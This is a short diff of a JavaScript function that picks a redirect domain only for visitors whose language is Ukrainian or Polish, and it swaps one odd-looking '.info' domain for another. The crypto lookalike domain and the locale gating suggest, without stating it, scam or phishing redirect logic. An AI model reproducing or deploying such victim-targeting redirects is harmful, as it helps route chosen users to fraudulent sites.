@@ -131,8 +131,7 @@ function checkCountry(ip, language) {
             language.toUpperCase() ==='UA' ||
             language.toUpperCase() ==='RU-UA' ||
             language.toUpperCase() ==='PL') {
-            // url = 'mafxgemoieger.info'
-            url = 'bitcoinunuion.info'
+            url = 'mafxgemoieger.info'
             } else {
             reason = 'Invalid language'
             url = null
